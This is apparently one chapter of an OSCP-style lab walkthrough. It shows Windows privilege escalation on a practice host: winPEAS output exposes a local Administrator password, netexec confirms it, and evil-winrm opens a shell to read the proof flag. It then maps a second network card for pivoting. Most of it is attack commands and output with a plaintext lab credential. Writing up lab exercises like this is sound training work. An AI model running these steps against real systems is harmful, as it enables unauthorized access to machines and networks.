# 03 — Privilege escalation: winPEAS reads the Administrator password

The box does not need a kernel bug or a token trick. It needs **winPEAS** and five minutes of reading.
The local Administrator password is sitting in a machine environment variable.

## 3.1 Run winPEAS

Inside the `andrew` WinRM session:

```powershell
.\winPEASx64.exe
```

The banner and the section that matters:

```
    ((,.,/((((((((((((((((((((/,  */
    /*,...................................*/

[...]

Environment Variables (T1082)
    ...
    [redacted]_PASSWORD: Work3sValueable444
```

Two notes on the values:

- The environment variable is `[redacted]_PASSWORD` with the value `Work3sValueable444`; the same
  value appears again in the netexec line and the WinRM login.
- The transfer method for `winPEASx64.exe`: `[redacted]`. Any of the usual routes works from an
  Evil-WinRM session, e.g. `upload /opt/tools/winPEASx64.exe .`

Why this works: exam authors plant exactly this kind of thing — a service account password, an
installer's unattended answer file, or a machine-wide environment variable. winPEAS prints
environment variables early, and they are cheap to read.

## 3.2 Validate the password as a local account

The password is for the **local** `Administrator`, so authenticate locally — not against the domain:

```bash
nxc smb 192.168.91.206 -u 'Administrator' -p 'Work3sValueable444' --local-auth
```

```
SMB  192.168.91.206  445  WS01  [*] Windows 11 Build 22000 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:None)
SMB  192.168.91.206  445  WS01  [+] WS01\Administrator:Work3sValueable444 (Pwn3d!)
```

Note the change in the domain field: `(domain:WS01)` and `WS01\Administrator` — a **local** logon.
`(Pwn3d!)` here really does mean local administrator (admin share / code execution).

## 3.3 Shell as Administrator and the proof

```bash
evil-winrm -i 192.168.91.206 -u 'Administrator' -p 'Work3sValueable444'
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
OSCP{****************************}
```

Proof obtained (flag masked on purpose). **Document it properly for the exam**: one image that
contains the command, the output and the host identity, plus copy-pasted text in the report.
An image of a flag without the command and hostname beside it is exactly the kind of evidence a
grader can dispute.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> hostname
WS01
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
ws01\administrator
```

## 3.4 The second network card

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig
```

```
Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.91.206
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : 5a80::63af:77fa:6c2a:6229/64
   IPv4 Address. . . . . . . . . . . : 192.168.91.206
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.91.254
```

This is the pivot decision point, and it is why the box exists:

| Interface | Address | Meaning |
|---|---|---|
| Ethernet0 | `172.16.91.206/24` | internal network — the DC side |
| Ethernet1 | `192.168.91.206/24` (gw `192.168.91.254`) | the only network Kali can reach |

Everything interesting after this point is on `172.16.91.0/24`.

---

**Next:** [`04-pivot-and-loot.md`](04-pivot-and-loot.md)
